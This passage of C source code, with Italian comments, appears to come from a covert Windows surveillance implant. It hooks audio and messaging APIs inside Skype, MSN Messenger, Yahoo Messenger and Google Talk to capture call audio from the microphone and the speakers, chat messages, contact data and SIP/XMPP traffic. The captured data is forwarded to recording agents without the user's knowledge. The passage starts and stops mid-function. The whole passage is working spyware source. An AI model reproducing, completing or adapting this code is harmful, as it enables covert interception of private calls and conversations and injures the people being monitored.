	BYTE *func_ptr;
	IMMDeviceEnumerator *pMMDeviceEnumerator;
	IMMDevice			*pMMDevice;
    HRESULT hr = S_OK;

	CoInitialize(NULL);

    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eCapture, eCommunications, &pMMDevice);
	pMMDeviceEnumerator->Release();
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	func_ptr = GetWASAPICaptureFunctionAddress(pMMDevice, func_num, n_channels, sampling);
	pMMDevice->Release();
	CoUninitialize();

	if (func_ptr) {
		*ret_ptr = func_ptr;
		return S_OK;
	}

	return S_FALSE;
}

HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE *class_ptr, 
											BYTE **ppData,
											UINT32 *pNumFramesToRead,
											DWORD *pdwFlags,
											UINT64 *pu64DevicePosition,
											UINT64 *pu64QPCPosition)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIGetBufferStruct)
	CALL_ORIGINAL_API(6);

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (ret_code!=S_OK || !Active || !(*Active))
		return ret_code;

	pData->obj_ptr = class_ptr;
	pData->audio_data = *ppData;
	
	return ret_code;
}

HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE *class_ptr, 
											BYTE **ppData,
											UINT32 *pNumFramesToRead,
											DWORD *pdwFlags,
											UINT64 *pu64DevicePosition,
											UINT64 *pu64QPCPosition)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIGetBufferStruct)
	CALL_ORIGINAL_API(6);

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (ret_code!=S_OK || !Active || !(*Active))
		return ret_code;

	// E' una nuova chiamata
	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
		pData->obj_ptr = NULL;
		pData->obj_ptr2 = NULL;
	}

	// Memorizza entrambi gli oggetti aperti da MSN
	if (pData->obj_ptr == NULL) {
		pData->obj_ptr = class_ptr;
		pData->audio_data = *ppData;
	} else if (pData->obj_ptr != class_ptr) {
		if (pData->obj_ptr2 == NULL) {
			pData->obj_ptr2 = class_ptr;
			pData->audio_data2 = *ppData;
		}
	}

	if (pData->obj_ptr == class_ptr)
		pData->audio_data = *ppData;

	if (pData->obj_ptr2 == class_ptr)
		pData->audio_data2 = *ppData;	

	return ret_code;
}

DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIGetBufferData.obj_ptr = NULL;
	WASAPIGetBufferData.audio_data = NULL;

	if (GetWASAPICaptureFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
		return 1;

	WASAPIGetBufferData.dwHookLen = 350;
	return 0;
}

DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
			return 1; // Hooka solo MSN
	} else
		return 1;
	
	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIGetBufferData.obj_ptr = NULL;
	WASAPIGetBufferData.obj_ptr2 = NULL;
	WASAPIGetBufferData.audio_data = NULL;
	WASAPIGetBufferData.audio_data2 = NULL;

	if (GetWASAPICaptureFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
		return 1;

	WASAPIGetBufferData.dwHookLen = 550;
	return 0;
}

HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE *class_ptr, 
												DWORD NumFramesWrittem)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIReleaseBufferStruct)
	
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (Active && (*Active)) {
		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
			if (pData->sampling != 0) {
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_INPUT, IPC_HI_PRIORITY);
				pData->sampling = 0;
			}
			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			pData->c_data->obj_ptr = NULL;
		}
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}

HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE *class_ptr, 
												DWORD NumFramesWrittem)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIReleaseBufferStruct)
	
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (Active && (*Active)) {
		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
		if (pData->c_data->obj_ptr2==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
			if (pData->sampling2 != NumFramesWrittem*100) {
				pData->sampling2 = NumFramesWrittem*100;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling2), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
			}
			LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*MSN_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
		}

		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
			if (pData->sampling != NumFramesWrittem*100) {
				pData->sampling = NumFramesWrittem*100;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_INPUT, IPC_HI_PRIORITY);
			}
			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*MSN_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
		}
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}

DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
	WASAPIReleaseBufferData.prog_type = VOIP_SKWSA;

	if (GetWASAPICaptureFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
		return 1;

	WASAPIReleaseBufferData.dwHookLen = 700;
	return 0;
}

DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (_stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
			return 1; // Hooka solo MSN
	} else
		return 1;
	
	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
	WASAPIReleaseBufferData.prog_type = VOIP_MSNWS;
	WASAPIReleaseBufferData.sampling = NULL;
	WASAPIReleaseBufferData.sampling2 = NULL;

	if (GetWASAPICaptureFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), NULL) != S_OK)
		return 1;

	WASAPIReleaseBufferData.dwHookLen = 700;
	return 0;
}

///////////////////////////
//
//   waveOutWrite
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	waveOutGetID_t pwaveOutGetID;
} waveOutWriteStruct;

waveOutWriteStruct waveOutWriteData;

DWORD __stdcall PM_waveOutWrite(HWAVEOUT ARG1,
                                WAVEHDR *WaveHdr,
					  		    DWORD ARG3)
{
	UINT devID;
	BOOL *Active;
	DWORD channels = 1;

	MARK_HOOK

	INIT_WRAPPER(waveOutWriteStruct)
	CALL_ORIGINAL_API(3)

	// Se e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=MMSYSERR_NOERROR)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	pData->pwaveOutGetID(ARG1, &devID);

	if (pData->prog_type == VOIP_SKYPE)
		channels = 2;

	// Non registra le scritture sul wave mapper
	if (devID!=0xFFFFFFFF) 
		// Invia tutto al dispatcher
		LARGE_CLI_WRITE((BYTE *)WaveHdr->lpData, WaveHdr->dwBufferLength, (channels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);

	return ret_code;
}


DWORD PM_waveOutWrite_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (_stricmp(proc_name, "skype.exe") &&
			_stricmp(proc_name, "yahoomessenger.exe") &&
			_stricmp(proc_name, "googletalk.exe"))
			return 1; // Hooka solo skype, yahoo, gtalk
	} else
		return 1;

	if (!_stricmp(proc_name, "skype.exe"))
		waveOutWriteData.prog_type = VOIP_SKYPE;
	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
		waveOutWriteData.prog_type = VOIP_YAHOO;
	else if (!_stricmp(proc_name, "googletalk.exe"))
		waveOutWriteData.prog_type = VOIP_GTALK;
	else
		waveOutWriteData.prog_type = 0;

	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
	VALIDPTR(waveOutWriteData.pwaveOutGetID = (waveOutGetID_t) HM_SafeGetProcAddress(hMod, (char*)"waveOutGetID"))
	waveOutWriteData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	waveOutWriteData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;

	waveOutWriteData.dwHookLen = 750;
	return 0;
}


///////////////////////////
//
// waveInUnprepareHeader
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	waveInGetID_t pwaveInGetID;
} waveInUnprepareHeaderStruct;

waveInUnprepareHeaderStruct waveInUnprepareHeaderData;

DWORD __stdcall PM_waveInUnprepareHeader(HWAVEOUT ARG1,
                                         WAVEHDR *WaveHdr,
					  		             DWORD ARG3)
{
	UINT devID;
	BOOL *Active;
	DWORD channels = 1;

	MARK_HOOK

	INIT_WRAPPER(waveInUnprepareHeaderStruct)
	CALL_ORIGINAL_API(3)

	// Se e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=MMSYSERR_NOERROR)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	pData->pwaveInGetID(ARG1, &devID);

	if (pData->prog_type == VOIP_SKYPE)
		channels = 2;

	// Non registra le scritture sul wave mapper
	if (devID!=0xFFFFFFFF) 
		// Invia tutto al dispatcher
		LARGE_CLI_WRITE((BYTE *)WaveHdr->lpData, WaveHdr->dwBufferLength, (channels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);

	return ret_code;
}


DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (_stricmp(proc_name, "skype.exe") &&
			_stricmp(proc_name, "yahoomessenger.exe") &&
			_stricmp(proc_name, "googletalk.exe"))
			return 1; // Hooka solo skype, yahoo, gtalk
	} else 
		return 1;

	if (!_stricmp(proc_name, "skype.exe"))
		waveInUnprepareHeaderData.prog_type = VOIP_SKYPE;
	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
		waveInUnprepareHeaderData.prog_type = VOIP_YAHOO;
	else if (!_stricmp(proc_name, "googletalk.exe"))
		waveInUnprepareHeaderData.prog_type = VOIP_GTALK;
	else
		waveInUnprepareHeaderData.prog_type = 0;

	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
	VALIDPTR(waveInUnprepareHeaderData.pwaveInGetID = (waveInGetID_t) HM_SafeGetProcAddress(hMod, (char *)"waveInGetID"))
	waveInUnprepareHeaderData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	waveInUnprepareHeaderData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	
	waveInUnprepareHeaderData.dwHookLen = 750;
	return 0;
}


///////////////////////////
//
//   SendMessageTimeOut
//
///////////////////////////
// Server per Skype
typedef struct {
	COMMONDATA;
	BOOL voip_is_sent;
	HWND voip_skapi_wnd;
	HWND voip_skapi_swd;

	BOOL im_is_sent;
	HWND im_skapi_wnd;
	HWND im_skapi_swd;

	BOOL cn_is_sent;
	HWND cn_skapi_wnd;
	HWND cn_skapi_swd;

	BOOL is_skypepm;
	BOOL is_spm_installed;
	UINT attach_msg;
} SendMessageStruct;
SendMessageStruct SendMessageData;

LRESULT __stdcall PM_SendMessage(  HWND hWnd,
								   UINT Msg,
								   WPARAM wParam,
								   LPARAM lParam,
								   UINT fuFlags,
								   UINT uTimeout,
								   PDWORD_PTR lpdwResult)
{
	BOOL *Active_VOIP, *Active_IM, *Active_Contacts;
	BYTE *msg_body;
	COPYDATASTRUCT *cdata;

	MARK_HOOK
	INIT_WRAPPER(SendMessageStruct)
	CALL_ORIGINAL_API(7)

	// Controlla se il monitor e' attivo
	Active_VOIP = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	Active_IM = (BOOL *)pData->pHM_IpcCliRead(PM_IMAGENT_SKYPE);
	Active_Contacts = (BOOL *)pData->pHM_IpcCliRead(PM_CONTACTSAGENT);
	if (!Active_VOIP || !Active_IM || !Active_Contacts)
		return ret_code;

	// Se sono disabilitati entrambi esce
	if (!(*Active_VOIP) && !(*Active_IM) && !(*Active_Contacts))
		return ret_code;

	if (!pData->pHM_IpcCliWrite) 
		return ret_code;

	// Skype ha dato l'ok per l'attach. Notifico i processi per poter mandare i messaggi delle api 
	if (!pData->is_spm_installed && !pData->is_skypepm && Msg==pData->attach_msg && wParam!=NULL) {
		if ((*Active_VOIP)) {
			if (pData->voip_skapi_swd != hWnd  || pData->voip_skapi_wnd != (HWND)wParam) {
				pData->voip_skapi_swd = hWnd;
				pData->voip_skapi_wnd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_IM)) {
			if (pData->im_skapi_swd != hWnd  || pData->im_skapi_wnd != (HWND)wParam) {
				pData->im_skapi_swd = hWnd;
				pData->im_skapi_wnd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_Contacts)) {
			if (pData->cn_skapi_swd != hWnd  || pData->cn_skapi_wnd != (HWND)wParam) {
				pData->cn_skapi_swd = hWnd;
				pData->cn_skapi_wnd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
	}
	
	if (Msg != WM_COPYDATA)
		return ret_code;
	cdata = (COPYDATASTRUCT *)lParam;
	msg_body = (BYTE *)cdata->lpData;

	if (pData->is_skypepm) {
		if ((*Active_VOIP)) {
			if (pData->voip_skapi_wnd != hWnd  || pData->voip_skapi_swd != (HWND)wParam) {
				pData->voip_skapi_wnd = hWnd;
				pData->voip_skapi_swd = (HWND)wParam;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_IM)) {
			if (pData->im_skapi_wnd != hWnd  || pData->im_skapi_swd != (HWND)wParam) {
				pData->im_skapi_wnd = hWnd;
				pData->im_skapi_swd = (HWND)wParam;
				// Usa la dispatch del tag utilizzato per start/stop dell'agente
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_Contacts)) {
			if (pData->cn_skapi_wnd != hWnd  || pData->cn_skapi_swd != (HWND)wParam) {
				pData->cn_skapi_wnd = hWnd;
				pData->cn_skapi_swd = (HWND)wParam;
				// Usa la dispatch del tag utilizzato per start/stop dell'agente
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
			}
		}
	} else { // siamo dentro Skype
		if ((*Active_VOIP)) {
			if (!pData->voip_is_sent) {
				pData->voip_is_sent = TRUE;
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
			}
		}
		if ((*Active_IM)) {
			if (!pData->im_is_sent) {
				pData->im_is_sent = TRUE;
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
			}
		}

		if (cdata->cbData <= 4)
			return ret_code;

		// Scremiamo i messaggi che sicuramente non ci servono
		// CALL , #1411...  ci servono
		if ((*Active_VOIP)) {
			if ( (msg_body[0]=='C' && msg_body[1]=='A' && msg_body[2]=='L' && msg_body[3]=='L')  ||
				 (msg_body[1]=='1' && msg_body[2]=='4' && msg_body[3]=='1' && msg_body[4]=='1'))
				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)cdata->lpData, cdata->cbData, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
		}

		if ((*Active_IM)) {
			if ( (msg_body[0]=='C' && msg_body[1]=='H' && msg_body[2]=='A' && msg_body[3]=='T')  ||
				 (msg_body[0]=='M' && msg_body[1]=='E' && msg_body[2]=='S' && msg_body[3]=='S')  ||
				 (msg_body[1]=='I' && msg_body[2]=='M' && msg_body[3]=='A' && msg_body[4]=='G'))
				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)cdata->lpData, cdata->cbData, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
		}

		if ((*Active_Contacts)) {
			DWORD data_len;
			data_len = cdata->cbData;
			// Se eccedesse, il messaggio non verrebbe mandato proprio
			if (data_len > MAX_MSG_LEN)
				data_len = MAX_MSG_LEN;
			if ( (msg_body[0]=='A' && msg_body[1]=='U' && msg_body[4]=='_' && msg_body[5]=='C') ||
				 (msg_body[0]=='C' && msg_body[1]=='U' && msg_body[2]=='R' && msg_body[3]=='R'))
				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)cdata->lpData, data_len, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
		}

	}
	return ret_code;
}


DWORD PM_SendMessage_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo skype
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		SendMessageData.is_skypepm = FALSE;
		if (!_stricmp(proc_name, "skypepm.exe")) {
			SendMessageData.is_skypepm = TRUE; // siamo in skypepm
		} else if (_stricmp(proc_name, "skype.exe"))
			return 1; // Se non siamo in skype  non mette l'hook sulla sendmessage
	} else
		return 1;

	if (IsSkypePMInstalled())
		SendMessageData.is_spm_installed = TRUE;
	else
		SendMessageData.is_spm_installed = FALSE;

	SendMessageData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	SendMessageData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	SendMessageData.voip_is_sent = FALSE;
	SendMessageData.voip_skapi_wnd = 0;
	SendMessageData.voip_skapi_swd = 0;
	SendMessageData.im_is_sent = FALSE;
	SendMessageData.im_skapi_wnd = 0;
	SendMessageData.im_skapi_swd = 0;
	SendMessageData.cn_is_sent = FALSE;
	SendMessageData.cn_skapi_wnd = 0;
	SendMessageData.cn_skapi_swd = 0;
	SendMessageData.attach_msg = RegisterWindowMessage("SkypeControlAPIAttach");

	SendMessageData.dwHookLen = 2650;
	return 0;
}


///////////////////////////
//
//   Recv e Send
//
///////////////////////////
// Server per Yahoo Messenger
typedef struct {
	COMMONDATA;
} RecvStruct;
RecvStruct RecvData;

int __stdcall PM_Recv(SOCKET s,
					  char *buf,
					  int len,
					  int flags)
{
	BOOL *Active;
	DWORD msg_len;

	MARK_HOOK
	INIT_WRAPPER(RecvStruct)
	CALL_ORIGINAL_API(4)

	// Controlla il valore di ritorno
	if (!ret_code || ret_code==SOCKET_ERROR || buf==NULL)
		return ret_code;
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	msg_len = ret_code;
	if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_IN, IPC_HI_PRIORITY);
	else if (msg_len>15 && buf[0]=='<' && buf[1]=='i' && buf[2]=='q' && buf[3]==' ')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_GTALK_IN, IPC_HI_PRIORITY);
	
	return ret_code;
}

int __stdcall PM_Send(SOCKET s,
					  char *buf,
					  int len,
					  int flags)
{
	BOOL *Active;
	DWORD msg_len;

	MARK_HOOK
	INIT_WRAPPER(RecvStruct)
	CALL_ORIGINAL_API(4)

	// Controlla il valore di ritorno
	if (!ret_code || ret_code==SOCKET_ERROR || buf==NULL)
		return ret_code;
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	msg_len = ret_code;
	if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_OUT, IPC_HI_PRIORITY);
	else if (msg_len>15 && buf[0]=='<' && buf[1]=='i' && buf[2]=='q' && buf[3]==' ')
		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_GTALK_OUT, IPC_HI_PRIORITY);
	else if(msg_len > 7 && buf[0]=='U' && buf[1]=='U' && buf[2]=='N' && buf[3]==' ')
		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_MSN_OUT, IPC_HI_PRIORITY);

	return ret_code;
}

DWORD PM_Recv_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta di un programma da hookare
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (_stricmp(proc_name, "YahooMessenger.exe") &&
			_stricmp(proc_name, "Googletalk.exe") &&
			_stricmp(proc_name, "msnmsgr.exe"))
			return 1; // Hooka solo YahooMessenger, GTalk e MSN
	} else{
		return 1;
	}

	RecvData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	RecvData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	RecvData.dwHookLen = 850;
	return 0;
}


///////////////////////////
//
//  WSARecv
//
///////////////////////////
// Server per Yahoo Messenger
typedef struct _WSABUF {
	ULONG len;     /* the length of the buffer */
	__field_bcount(len) CHAR FAR *buf; /* the pointer to the buffer */
} WSABUF, FAR * LPWSABUF;
typedef struct _OVERLAPPED *    LPWSAOVERLAPPED;
typedef void (WINAPI *LPWSAOVERLAPPED_COMPLETION_ROUTINE)(DWORD, DWORD, LPWSAOVERLAPPED, DWORD);
typedef struct {
	COMMONDATA;
} WSARecvStruct;
WSARecvStruct WSARecvData;

int FAR PASCAL PM_WSARecv(SOCKET s,
						LPWSABUF lpBuffers,
						DWORD dwBufferCount,
						LPDWORD lpNumberOfBytesRecvd,
						LPDWORD lpFlags,
						LPWSAOVERLAPPED lpOverlapped,
						LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	BOOL *Active;
	char *buf;
	DWORD msg_len;

	MARK_HOOK
	INIT_WRAPPER(WSARecvStruct)
	CALL_ORIGINAL_API(7)

	// Controlla il valore di ritorno
	if (ret_code!=0)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
